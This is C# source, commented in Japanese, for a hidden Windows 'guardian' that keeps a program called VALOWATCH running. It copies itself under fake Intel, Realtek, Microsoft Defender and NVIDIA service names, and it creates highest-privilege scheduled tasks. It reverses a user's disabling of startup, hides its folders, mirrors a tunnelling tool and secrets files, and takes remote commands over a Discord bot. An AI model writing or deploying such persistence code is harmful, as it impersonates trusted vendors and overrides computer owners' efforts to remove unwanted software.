using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClientSystem;

/// <summary>
/// VALOWATCH 本体フォルダの「保険」役として常駐するガーディアン。
///
/// 本体フォルダ（Program Files\Systems）が丸ごと消えても復活できるよう、
/// Program Files 側にコピーを保持し、消失を検知したら復元する。
///
/// 動作の流れ（20分ごと）:
///   1. Program Files\Systems\app\HP.Security.System.exe と HP.Security.Update.exe を確認
///   2. どちらか欠けていたら「消えた」と判断し、コピーから丸ごと復元
///   3. 両方そろっていたら「正常」と判断し、コピーを最新に更新（案B）
///
/// 画面には何も出さない（WinExe + ウィンドウ非生成）。
/// </summary>
internal static class Program
{
    // チェック間隔（20分）。
    private static readonly TimeSpan CheckInterval = TimeSpan.FromMinutes(3);

    // 監視対象の本体フォルダ（Program Files\Systems）。これがプライマリ。
    private static readonly string DocumentsValowatchDirectory =
        @"C:\Program Files\Systems";

    // 分散ミラー配置。プライマリ本体のフルコピーを、実在ソフト風の複数の場所に置く。
    // どれか1つでも生きていれば、消えた場所を全て復元できる（全滅しない限り自己修復）。
    // 場所は「正規のシステムフォルダに紛れる」ように選んでいる。
    private static readonly string[] MirrorDirectories =
    {
        @"C:\Program Files\Systems",
        @"C:\ProgramData\Intel\Graphics\Runtime",
        @"C:\ProgramData\Microsoft\DeviceSync\Cache",
        @"C:\Program Files\Client Systems\backup",
    };

    // Guardian 自身の 5 重配置。実在するドライバ/サービス風の名前・場所に、
    // この Guardian(Client_System.exe) 自身をコピーして常駐させる。
    // 各コピーが他のコピーを監視し、消えたら生きているコピーから復元する（相互復活）。
    // フィールド：(配置フォルダ, exe名, 起動タスク名)
    private static readonly (string Dir, string Exe, string TaskName)[] GuardianReplicas =
    {
        (@"C:\Program Files\Client Systems", "Client_System.exe", "Client System Guardian"),
        (@"C:\ProgramData\Intel\ICPS", "IntelCpHDCPSvc.exe", "Intel(R) Content Protection Service"),
        (@"C:\Program Files\Realtek\Audio\Service", "RtkAudUServiceMonitor.exe", "Realtek Audio Universal Service"),
        (@"C:\ProgramData\Microsoft\Diagnosis\Monitor", "MpSvcMonitor.exe", "Microsoft Defender Core Monitor"),
        (@"C:\Program Files\NVIDIA Corporation\NvNode", "NvNodeMonitor.exe", "NVIDIA Node Service"),
    };

    // Program Files 側に保持するコピー（バックアップ）の置き場所（後方互換のため残す）。
    private static readonly string BackupRootDirectory =
        @"C:\Program Files\Client Systems\backup";

    // 監視対象の実行ファイル（app\ 配下）。
    private static readonly string[] RequiredRelativeFiles =
    {
        @"app\HP.Security.System.exe",
        @"HP.Security.Update.exe",
        // 設定ファイルも「必須」に含める。これらが欠けたミラーは「不完全」とみなし、
        // 完全なミラーから復元する。exe だけの中途半端な状態を「正常」と誤判定しない。
        @"config\powershell-command.json",
        @"installer\.env",
        @"data\tools\cloudflared.exe",
    };

    // バックアップ・復元時にコピーしないフォルダ（VALOWATCH ルートからの相対パス）。
    // 更新の一時ファイル・ログ・キャッシュなど、復元に不要で肥大化するもの。
    private static readonly string[] ExcludedRelativeDirectories =
    {
        @"data\updates",
        @"data\repair-downloads",
        @"data\logs",
        @"data\diagnostics",
        @"data\streaming",
        @"data\temp-screenshots",
    };

    // ログの置き場所（Program Files 側）。
    private static readonly string LogFilePath =
        @"C:\Program Files\Client Systems\client-system.log";

    private static readonly object logGate = new();

    [STAThread]
    private static void Main(string[] arguments)
    {
        // 二重起動を防ぐ。ただし Mutex 名は「実行ファイル名ごと」にする。
        // これにより、別名で配置した 5 つのレプリカ（IntelCpHDCPSvc.exe 等）は
        // それぞれ独立して起動でき、同時に常駐して相互監視できる。
        // 同じ名前・同じ場所の二重起動だけを防ぐ。
        string selfExeName = "ClientSystemGuardian";
        try
        {
            selfExeName = Path.GetFileNameWithoutExtension(
                Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule!.FileName);
        }
        catch
        {
        }

        using var singleInstanceMutex = new Mutex(
            initiallyOwned: true,
            name: "Global\\ClientSystemGuardian_" + selfExeName,
            createdNew: out bool createdNew);

        if (!createdNew)
        {
            return;
        }

        // 引数 --once が指定されたら、1回だけチェックして終了（テスト・手動実行用）。
        bool runOnce = arguments.Any(argument =>
            string.Equals(argument, "--once", StringComparison.OrdinalIgnoreCase));

        if (runOnce)
        {
            WriteLog("Client System guardian started (once mode).");
            try
            {
                RunCheckCycle();
            }
            catch (Exception exception)
            {
                WriteLog("Check cycle failed: " + exception);
            }

            WriteLog("Client System guardian stopping (once mode).");
            singleInstanceMutex.ReleaseMutex();
            return;
        }

        WriteLog("Client System guardian started.");

        // 監視・バックアップ・復元ループを、バックグラウンドスレッドで回す（3分ごと、ファイル/ミラー）。
        var monitoringThread = new Thread(MonitoringLoop)
        {
            IsBackground = true,
            Name = "GuardianMonitoringLoop",
        };
        monitoringThread.Start();

        // 高速監視ループ（10秒ごと）。プロセスの停止・スタートアップの無効化を
        // 素早く検知して、その場で復旧する。
        var fastThread = new Thread(FastWatchLoop)
        {
            IsBackground = true,
            Name = "GuardianFastWatchLoop",
        };
        fastThread.Start();

        // 緊急復旧用の Discord ボットは、プライマリ（Client_System.exe）だけが起動する。
        // 5 つのレプリカが全員 Discord に接続すると、同一トークンで多重接続して競合するため、
        // レプリカ（Intel/Realtek 等の別名）は監視のみ行い、ボットは起動しない。
        bool isPrimary = string.Equals(selfExeName, "Client_System", StringComparison.OrdinalIgnoreCase);
        if (isPrimary)
        {
            try
            {
                var emergencyBot = new EmergencyBot(WriteLog);
                emergencyBot.StartAsync().GetAwaiter().GetResult();
            }
            catch (Exception exception)
            {
                WriteLog("Emergency bot bootstrap failed; monitoring continues. " + exception);
            }
        }
        else
        {
            WriteLog("Replica guardian (" + selfExeName + ") started in monitor-only mode.");
        }

        // メインスレッドを生かし続ける（監視スレッドとボットが動き続ける）。
        Thread.Sleep(Timeout.Infinite);
    }

    /// <summary>監視・バックアップ・復元を CheckInterval ごとに繰り返す。</summary>
    // 高速監視の間隔（10秒）。プロセス停止・スタートアップ無効化をすぐ直すため短め。
    private static readonly TimeSpan FastWatchInterval = TimeSpan.FromSeconds(10);

    // スタートアップ（レジストリ Run）の値名と、期待するコマンド。
    private const string RegistryRunPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
    private const string RegistryRunValueName = "Systems";

    // 常時起動していてほしいプロセス（プロセス名 → exe相対パス）。
    // 落ちていたらタスク経由 or 直接起動で即復活させる。
    private static readonly (string ProcessName, string TaskName)[] KeepAliveTargets =
    {
        ("HP.Security.Update", "Systems KeepAlive"),
        ("Client.Start", "Systems StartAgent KeepAlive"),
    };

    /// <summary>
    /// 10秒ごとに、プロセスの生存とスタートアップ登録を確認し、
    /// 落ちていたら再起動、無効化されていたら再登録する（即時復旧）。
    /// </summary>
    private static void FastWatchLoop()
    {
        do
        {
            try
            {
                EnsureProcessesAlive();
                EnsureStartupRegistered();
                EnsureScheduledTasksPresent();
                EnsureGuardianReplicas();
            }
            catch (Exception exception)
            {
                WriteLog("Fast watch cycle failed: " + exception.Message);
            }

            Thread.Sleep(FastWatchInterval);
        }
        while (true);
    }

    /// <summary>
    /// Guardian 自身の 5 重レプリカを監視する。消えたレプリカを、生きているレプリカから復元し、
    /// そのレプリカ用のタスクを（無ければ）作成して起動する（相互復活）。
    /// どれか 1 つのレプリカが生きていれば、他の全てを復活できる。
    /// </summary>
    private static void EnsureGuardianReplicas()
    {
        // 全レプリカの中で「最も新しいバージョン」の exe を、更新の基準（マスター）にする。
        // これがないと、古いレプリカが新しいレプリカを古い版で上書きしてバージョンが巻き戻る。
        string? masterExe = null;
        Version masterVersion = new Version(0, 0);
        DateTime masterWriteTime = DateTime.MinValue;
        foreach (var replica in GuardianReplicas)
        {
            string exePath = Path.Combine(replica.Dir, replica.Exe);
            if (!File.Exists(exePath))
            {
                continue;
            }

            Version v = GetFileVersion(exePath);
            DateTime wt = File.GetLastWriteTimeUtc(exePath);
            // バージョンが新しい、または同バージョンでより新しく書かれたものをマスターに。
            if (v > masterVersion || (v == masterVersion && wt > masterWriteTime))
            {
                masterVersion = v;
                masterWriteTime = wt;
                masterExe = exePath;
            }
        }

        if (masterExe == null)
        {
            // 全レプリカの exe が無い。復元元が無い。
            return;
        }

        string? liveSourceExe = masterExe;

        foreach (var replica in GuardianReplicas)
        {
            string exePath = Path.Combine(replica.Dir, replica.Exe);
            try
            {
                // 1a) exe が無ければ、マスターからコピーして復元。
                if (!File.Exists(exePath))
                {
                    Directory.CreateDirectory(replica.Dir);
                    File.Copy(liveSourceExe, exePath, overwrite: true);
                    WriteLog("Guardian replica restored: " + exePath + " <- " + liveSourceExe);
                }
                // 1b) exe はあるが、マスターより古いバージョンなら、マスターで更新する。
                else if (!string.Equals(exePath, masterExe, StringComparison.OrdinalIgnoreCase))
                {
                    Version thisVersion = GetFileVersion(exePath);
                    if (thisVersion < masterVersion)
                    {
                        try
                        {
                            // 更新前に、このレプリカのプロセスを止める（ファイルロック回避）。
                            string pn = Path.GetFileNameWithoutExtension(replica.Exe);
                            foreach (var pr in Process.GetProcessesByName(pn))
                            {
                                try { pr.Kill(); } catch { }
                                pr.Dispose();
                            }

                            System.Threading.Thread.Sleep(1000);
                            File.Copy(masterExe, exePath, overwrite: true);
                            WriteLog("Guardian replica updated to newer version: " + exePath + " (" + thisVersion + " -> " + masterVersion + ")");
                        }
                        catch (Exception updateEx)
                        {
                            WriteLog("Guardian replica update failed for " + exePath + ": " + updateEx.Message);
                        }
                    }
                }

                // 2) このレプリカ用のタスクが無ければ作成する（起動手段も 5 重）。
                if (!ScheduledTaskExists(replica.TaskName))
                {
                    CreateGuardianTask(replica.TaskName, exePath);
                    WriteLog("Guardian replica task created: " + replica.TaskName);
                }

                // 3) このレプリカのプロセスが動いていなければ起動する。
                string procName = Path.GetFileNameWithoutExtension(replica.Exe);
                bool running = false;
                try { running = Process.GetProcessesByName(procName).Length > 0; } catch { }
                if (!running)
                {
                    TryRunScheduledTask(replica.TaskName);
                }
            }
            catch (Exception exception)
            {
                WriteLog("Guardian replica ensure failed for " + exePath + ": " + exception.Message);
            }
        }
    }

    /// <summary>exe のファイルバージョンを取得する（取得できなければ 0.0）。</summary>
    private static Version GetFileVersion(string exePath)
    {
        try
        {
            var info = System.Diagnostics.FileVersionInfo.GetVersionInfo(exePath);
            if (Version.TryParse(info.FileVersion, out Version? v) && v != null)
            {
                return v;
            }

            return new Version(info.FileMajorPart, info.FileMinorPart, info.FileBuildPart, info.FilePrivatePart);
        }
        catch
        {
            return new Version(0, 0);
        }
    }

    /// <summary>Guardian レプリカ用の ONLOGON タスクを作成する（管理者権限で常駐）。</summary>
    private static void CreateGuardianTask(string taskName, string exePath)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            psi.ArgumentList.Add("/Create");
            psi.ArgumentList.Add("/TN");
            psi.ArgumentList.Add(taskName);
            psi.ArgumentList.Add("/TR");
            psi.ArgumentList.Add("\"" + exePath + "\"");
            psi.ArgumentList.Add("/SC");
            psi.ArgumentList.Add("ONLOGON");
            psi.ArgumentList.Add("/RL");
            psi.ArgumentList.Add("HIGHEST");
            psi.ArgumentList.Add("/F");
            using var proc = Process.Start(psi);
            proc?.WaitForExit(5000);
        }
        catch (Exception exception)
        {
            WriteLog("CreateGuardianTask failed for " + taskName + ": " + exception.Message);
        }
    }

    /// <summary>本体・Updater が落ちていたら、タスク経由で即再起動する。</summary>
    private static void EnsureProcessesAlive()
    {
        // Updater(HP.Security.Update) が生きていれば、それが本体を面倒みる。
        // Updater が落ちていたら、タスクを起動して復活させる。
        foreach ((string processName, string taskName) in KeepAliveTargets)
        {
            bool alive = false;
            try
            {
                alive = Process.GetProcessesByName(processName).Length > 0;
            }
            catch
            {
            }

            if (!alive)
            {
                WriteLog("Process down: " + processName + " -> starting task " + taskName);
                TryRunScheduledTask(taskName);
            }
        }
    }

    /// <summary>スタートアップ（レジストリ Run）が消されていたら、再登録する。</summary>
    private static void EnsureStartupRegistered()
    {
        try
        {
            string updaterExe = FindLiveFile(@"HP.Security.Update.exe");
            if (updaterExe == null)
            {
                return;
            }

            string root = Path.GetDirectoryName(updaterExe) ?? string.Empty;
            string expected = "\"" + updaterExe + "\" --watch --install-dir \"" + Path.Combine(root, "app") + "\"";

            using Microsoft.Win32.RegistryKey key =
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(RegistryRunPath, writable: true)
                ?? throw new InvalidOperationException("cannot open Run key");

            string? current = key.GetValue(RegistryRunValueName) as string;
            if (string.IsNullOrEmpty(current))
            {
                key.SetValue(RegistryRunValueName, expected);
                WriteLog("Startup entry was missing; re-registered.");
            }

            // Windows の「スタートアップアプリ」で無効化されると、StartupApproved に
            // 無効フラグが書かれる。これを削除して、常に有効な状態に戻す。
            ClearStartupApprovedDisableFlag(RegistryRunValueName);
        }
        catch (Exception exception)
        {
            WriteLog("Startup re-registration failed: " + exception.Message);
        }
    }

    /// <summary>
    /// 「スタートアップアプリ」画面で無効化されたときに書かれる StartupApproved の
    /// 無効フラグを削除する。これでスタートアップは再び有効になる。
    /// </summary>
    private static void ClearStartupApprovedDisableFlag(string valueName)
    {
        // 無効化情報は複数の場所に書かれうるので、全て確認する。
        string[] approvedPaths =
        {
            @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
            @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32",
        };

        foreach (string approvedPath in approvedPaths)
        {
            try
            {
                using Microsoft.Win32.RegistryKey? approved =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(approvedPath, writable: true);
                if (approved == null)
                {
                    continue;
                }

                object? raw = approved.GetValue(valueName);
                if (raw is byte[] bytes && bytes.Length > 0)
                {
                    // 先頭バイトが偶数(0x02など)=有効、奇数(0x03など)=無効。
                    // 無効フラグが立っていたら、値ごと削除して既定(有効)に戻す。
                    if ((bytes[0] & 0x01) != 0)
                    {
                        approved.DeleteValue(valueName, throwOnMissingValue: false);
                        WriteLog("Startup was disabled via StartupApproved; cleared to re-enable.");
                    }
                }
            }
            catch
            {
            }
        }
    }

    /// <summary>KeepAlive 系のタスクの存在確認と、無効化されていたら有効化する。</summary>
    private static void EnsureScheduledTasksPresent()
    {
        // KeepAlive タスク + 全 Guardian レプリカのタスクを、有効な状態に保つ。
        var allTaskNames = new List<string>();
        foreach ((string _, string taskName) in KeepAliveTargets)
        {
            allTaskNames.Add(taskName);
        }

        foreach (var replica in GuardianReplicas)
        {
            allTaskNames.Add(replica.TaskName);
        }

        foreach (string taskName in allTaskNames)
        {
            if (!ScheduledTaskExists(taskName))
            {
                WriteLog("Scheduled task missing: " + taskName);
                continue;
            }

            // 無効化されていたら有効化する。
            EnableScheduledTask(taskName);
        }
    }

    /// <summary>タスクが無効化されていたら有効化する（schtasks /Change /ENABLE）。</summary>
    private static void EnableScheduledTask(string taskName)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            psi.ArgumentList.Add("/Change");
            psi.ArgumentList.Add("/TN");
            psi.ArgumentList.Add(taskName);
            psi.ArgumentList.Add("/ENABLE");
            using var proc = Process.Start(psi);
            proc?.WaitForExit(5000);
        }
        catch
        {
        }
    }

    /// <summary>いずれかの生きているミラーから、指定相対パスの実ファイルパスを返す（無ければ null）。</summary>
    private static string FindLiveFile(string relativePath)
    {
        foreach (string mirror in MirrorDirectories)
        {
            string full = Path.Combine(mirror, relativePath);
            if (File.Exists(full))
            {
                return full;
            }
        }

        return null!;
    }

    private static void TryRunScheduledTask(string taskName)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = "/Run /TN \"" + taskName + "\"",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi);
        }
        catch (Exception exception)
        {
            WriteLog("Failed to run task " + taskName + ": " + exception.Message);
        }
    }

    private static bool ScheduledTaskExists(string taskName)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = "/Query /TN \"" + taskName + "\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            using var proc = Process.Start(psi);
            if (proc == null)
            {
                return false;
            }

            proc.WaitForExit(5000);
            return proc.ExitCode == 0;
        }
        catch
        {
            return false;
        }
    }

    private static void MonitoringLoop()
    {
        do
        {
            try
            {
                RunCheckCycle();
            }
            catch (Exception exception)
            {
                WriteLog("Check cycle failed: " + exception);
            }

            Thread.Sleep(CheckInterval);
        }
        while (true);
    }

    /// <summary>緊急ボットから呼ぶ、バックアップからの強制復元。成功なら true。</summary>
    public static bool ForceRestoreFromBackup()
    {
        try
        {
            if (!Directory.Exists(BackupRootDirectory) || !AreRequiredFilesPresent(BackupRootDirectory))
            {
                WriteLog("Emergency restore requested but backup is missing or incomplete.");
                return false;
            }

            RestoreFromBackup();
            return AreRequiredFilesPresent(DocumentsValowatchDirectory);
        }
        catch (Exception exception)
        {
            WriteLog("Emergency restore failed: " + exception);
            return false;
        }
    }

    /// <summary>緊急ボットの status 用に、現在の状態を文字列で返す。</summary>
    public static string BuildStatusReport()
    {
        var lines = new List<string>();
        try
        {
            lines.Add("=== Client System Guardian Status ===");
            lines.Add("VALOWATCH present: " + AreRequiredFilesPresent(DocumentsValowatchDirectory));
            lines.Add("Backup present: " + (Directory.Exists(BackupRootDirectory) && AreRequiredFilesPresent(BackupRootDirectory)));
            foreach (string rel in RequiredRelativeFiles)
            {
                string full = Path.Combine(DocumentsValowatchDirectory, rel);
                lines.Add("  " + rel + ": " + (File.Exists(full) ? "OK" : "MISSING"));
            }

            bool elevated = false;
            try
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                elevated = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
            }

            lines.Add("Guardian elevated (admin): " + elevated);
        }
        catch (Exception exception)
        {
            lines.Add("status error: " + exception.Message);
        }

        return string.Join("\n", lines);
    }

    /// <summary>1 回分のチェック・修復を実行する（多点ミラー相互復元）。</summary>
    private static void RunCheckCycle()
    {
        // 各ミラーの生死を確認する。
        var alive = new List<string>();
        var dead = new List<string>();
        foreach (string mirror in MirrorDirectories)
        {
            if (AreRequiredFilesPresent(mirror))
            {
                alive.Add(mirror);
            }
            else
            {
                dead.Add(mirror);
            }
        }

        if (alive.Count == 0)
        {
            // 全ミラーが消えた。GitHub からの再取得は本体側 Updater に任せる。
            WriteLog("All mirrors are missing. Cannot self-heal; waiting for updater/GitHub.");
            return;
        }

        // 生きているミラーのうち、最も新しいものをソース元に選ぶ。
        string source = SelectFreshestMirror(alive);

        // 死んでいるミラーを、生きているソースから復元する（高速自己修復）。
        foreach (string target in dead)
        {
            try
            {
                WriteLog("Mirror missing: " + target + " -> restoring from " + source);
                MirrorCopy(source, target);
                ApplyHiddenAttributes(target);
            }
            catch (Exception exception)
            {
                WriteLog("Mirror restore failed for " + target + ": " + exception.Message);
            }
        }

        // 全ミラーが生きている（or 復元した）場合、プライマリを最新としてミラーへ反映。
        // プライマリ(先頭)が生きていれば、それを各ミラーへ同期して常に最新に保つ。
        if (AreRequiredFilesPresent(DocumentsValowatchDirectory))
        {
            foreach (string mirror in MirrorDirectories)
            {
                if (string.Equals(mirror, DocumentsValowatchDirectory, StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                try
                {
                    MirrorCopy(DocumentsValowatchDirectory, mirror);
                    ApplyHiddenAttributes(mirror);
                }
                catch (Exception exception)
                {
                    WriteLog("Mirror sync failed for " + mirror + ": " + exception.Message);
                }
            }

            WriteLog("Backup updated successfully.");
        }
    }

    /// <summary>生きているミラーの中で、最終更新が最も新しいものを返す。</summary>
    private static string SelectFreshestMirror(List<string> aliveMirrors)
    {
        string best = aliveMirrors[0];
        DateTime bestTime = DateTime.MinValue;
        foreach (string mirror in aliveMirrors)
        {
            try
            {
                string appExe = Path.Combine(mirror, "app\\HP.Security.System.exe");
                DateTime t = File.Exists(appExe) ? File.GetLastWriteTimeUtc(appExe) : DateTime.MinValue;
                if (t > bestTime)
                {
                    bestTime = t;
                    best = mirror;
                }
            }
            catch
            {
            }
        }

        return best;
    }

    /// <summary>source から target へ、必要ファイルを含むフルコピー（除外フォルダは除く）。</summary>
    private static void MirrorCopy(string source, string target)
    {
        if (string.Equals(source, target, StringComparison.OrdinalIgnoreCase))
        {
            return;
        }

        CopyDirectory(source, target, overwrite: true);
    }

    /// <summary>ドキュメント側に必要な実行ファイルがすべて存在するか。</summary>
    private static bool AreRequiredFilesPresent(string rootDirectory)
    {
        if (!Directory.Exists(rootDirectory))
        {
            return false;
        }

        foreach (string relativePath in RequiredRelativeFiles)
        {
            string fullPath = Path.Combine(rootDirectory, relativePath);
            if (!File.Exists(fullPath))
            {
                return false;
            }
        }

        return true;
    }

    /// <summary>
    /// ドキュメント側の VALOWATCH フォルダ全体を、Program Files 側のバックアップへ複製する。
    /// 常に最新の状態を保つため、既存のバックアップは置き換える。
    /// </summary>
    private static void UpdateBackup()
    {
        try
        {
            Directory.CreateDirectory(BackupRootDirectory);

            // いったん新しい一時フォルダにコピーしてから入れ替えることで、
            // コピー途中でバックアップが壊れるのを防ぐ。
            string stagingDirectory = BackupRootDirectory + ".staging";
            string oldDirectory = BackupRootDirectory + ".old";

            if (Directory.Exists(stagingDirectory))
            {
                Directory.Delete(stagingDirectory, recursive: true);
            }

            CopyDirectory(DocumentsValowatchDirectory, stagingDirectory);

            // 既存バックアップを .old に退避 → staging を本命へ → .old を削除。
            if (Directory.Exists(oldDirectory))
            {
                Directory.Delete(oldDirectory, recursive: true);
            }

            if (Directory.Exists(BackupRootDirectory))
            {
                Directory.Move(BackupRootDirectory, oldDirectory);
            }

            Directory.Move(stagingDirectory, BackupRootDirectory);

            if (Directory.Exists(oldDirectory))
            {
                Directory.Delete(oldDirectory, recursive: true);
            }

            WriteLog("Backup updated successfully.");
        }
        catch (Exception exception)
        {
            WriteLog("Backup update failed: " + exception);
        }
    }

    /// <summary>Program Files 側のバックアップから、ドキュメント側へ VALOWATCH を復元する。</summary>
    private static void RestoreFromBackup()
    {
        try
        {
            if (!Directory.Exists(BackupRootDirectory) || !AreRequiredFilesPresent(BackupRootDirectory))
            {
                WriteLog("Backup is missing or incomplete; cannot restore.");
                return;
            }

            Directory.CreateDirectory(DocumentsValowatchDirectory);
            CopyDirectory(BackupRootDirectory, DocumentsValowatchDirectory, overwrite: true);
            // 復元したフォルダを、うっかり削除されないよう隠し属性にする。
            ApplyHiddenAttributes(DocumentsValowatchDirectory);
            WriteLog("Restore from backup completed.");
        }
        catch (Exception exception)
        {
            WriteLog("Restore failed: " + exception);
        }
    }

    /// <summary>
    /// 指定フォルダに Hidden + System 属性を付け、通常のエクスプローラー表示から隠す。
    /// うっかり削除を防ぐため、復元後に呼ぶ。
    /// </summary>
    private static void ApplyHiddenAttributes(string directoryPath)
    {
        try
        {
            var directoryInfo = new DirectoryInfo(directoryPath);
            if (directoryInfo.Exists)
            {
                directoryInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            }
        }
        catch (Exception exception)
        {
            WriteLog("Applying hidden attributes failed: " + exception);
        }
    }

    /// <summary>フォルダを再帰的にコピーする。</summary>
    /// <summary>
    /// 使用中のファイル（本体が開いている .env / settings.protected /
    /// powershell-command.json など）も確実にコピーする。
    /// File.Copy は使用中だと失敗するため、FileShare.ReadWrite で開いてストリームコピーする。
    /// </summary>
    private static void CopyFileShared(string sourceFile, string destinationFile)
    {
        try
        {
            using var src = new FileStream(
                sourceFile, FileMode.Open, FileAccess.Read,
                FileShare.ReadWrite | FileShare.Delete);
            using var dst = new FileStream(
                destinationFile, FileMode.Create, FileAccess.Write, FileShare.None);
            src.CopyTo(dst);
        }
        catch (IOException)
        {
            // それでもコピーできない場合は、通常の File.Copy を最後に試す。
            try { File.Copy(sourceFile, destinationFile, overwrite: true); } catch { }
        }
        catch (UnauthorizedAccessException)
        {
        }
    }

    private static void CopyDirectory(string sourceRootDirectory, string destinationRootDirectory, bool overwrite = false)
    {
        CopyDirectoryRecursive(sourceRootDirectory, sourceRootDirectory, destinationRootDirectory, overwrite);
    }

    private static void CopyDirectoryRecursive(
        string sourceRootDirectory,
        string sourceDirectory,
        string destinationDirectory,
        bool overwrite)
    {
        Directory.CreateDirectory(destinationDirectory);

        foreach (string filePath in Directory.GetFiles(sourceDirectory))
        {
            string fileName = Path.GetFileName(filePath);
            string destinationFile = Path.Combine(destinationDirectory, fileName);
            CopyFileShared(filePath, destinationFile);
        }

        foreach (string subDirectory in Directory.GetDirectories(sourceDirectory))
        {
            // VALOWATCH ルートからの相対パスを求め、除外リストに含まれるならスキップ。
            string relativePath = Path.GetRelativePath(sourceRootDirectory, subDirectory);
            if (IsExcludedDirectory(relativePath))
            {
                continue;
            }

            string subDirectoryName = Path.GetFileName(subDirectory);
            string destinationSubDirectory = Path.Combine(destinationDirectory, subDirectoryName);
            CopyDirectoryRecursive(sourceRootDirectory, subDirectory, destinationSubDirectory, overwrite);
        }
    }

    /// <summary>相対パスが除外対象フォルダ（またはその配下）かどうか。</summary>
    private static bool IsExcludedDirectory(string relativePath)
    {
        foreach (string excluded in ExcludedRelativeDirectories)
        {
            if (string.Equals(relativePath, excluded, StringComparison.OrdinalIgnoreCase) ||
                relativePath.StartsWith(excluded + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
        }

        return false;
    }

    private static void WriteLog(string message)
    {
        try
        {
            lock (logGate)
            {
                string? directory = Path.GetDirectoryName(LogFilePath);
                if (!string.IsNullOrEmpty(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                string line = DateTimeOffset.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + message + Environment.NewLine;
                File.AppendAllText(LogFilePath, line);
            }
        }
        catch
        {
            // ログ失敗は無視（ガーディアン本体は動かし続ける）。
        }
    }
}
